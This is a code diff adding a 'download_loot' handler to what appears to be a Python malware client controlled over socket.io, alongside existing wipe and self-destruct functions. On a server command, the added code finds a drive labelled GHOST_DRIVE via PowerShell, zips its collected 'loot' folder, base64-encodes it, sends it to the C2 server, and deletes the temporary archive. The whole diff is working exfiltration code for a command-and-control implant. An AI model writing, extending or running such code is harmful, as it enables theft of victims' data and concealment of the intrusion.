@@ -158,6 +158,53 @@ def trigger_wipe():
     self_destruct()
 
 @sio.event
+def download_loot():
+    print_log("DOWNLOAD LOOT COMMAND RECEIVED! Zipping and sending data...")
+    try:
+        import zipfile
+        import base64
+        import subprocess
+        
+        # 1. Cari GHOST_DRIVE menggunakan powershell
+        ps_cmd = "(Get-Volume | Where-Object FileSystemLabel -eq 'GHOST_DRIVE').DriveLetter"
+        result = subprocess.run(["powershell", "-Command", ps_cmd], capture_output=True, text=True)
+        drive_letter = result.stdout.strip()
+        
+        if not drive_letter:
+            print_log("GHOST_DRIVE not found. Cannot download loot.")
+            return
+            
+        loot_dir = f"{drive_letter}:\\sys_report"
+        if not os.path.exists(loot_dir):
+            print_log("No loot folder found on GHOST_DRIVE.")
+            return
+            
+        # 2. Zip folder tersebut ke TEMP
+        temp_zip = os.path.join(os.environ.get('TEMP', 'C:\\Windows\\Temp'), 'ghost_loot.zip')
+        
+        with zipfile.ZipFile(temp_zip, 'w', zipfile.ZIP_DEFLATED) as zipf:
+            for root, _, files in os.walk(loot_dir):
+                for file in files:
+                    file_path = os.path.join(root, file)
+                    arcname = os.path.relpath(file_path, start=loot_dir)
+                    zipf.write(file_path, arcname)
+                    
+        # 3. Baca fail zip dan tukar ke base64
+        with open(temp_zip, "rb") as f:
+            zip_data = f.read()
+            b64_zip = base64.b64encode(zip_data).decode('utf-8')
+            
+        # 4. Hantar ke server
+        sio.emit('loot_data', b64_zip)
+        print_log("Loot successfully sent to C2 server.")
+        
+        # 5. Padam zip sementara
+        os.remove(temp_zip)
+        
+    except Exception as e:
+        print_log(f"Failed to download loot: {e}")
+
+@sio.event
 def execute_json_command(data):
     print_log(f"Received JSON Command: {data}")
     try:
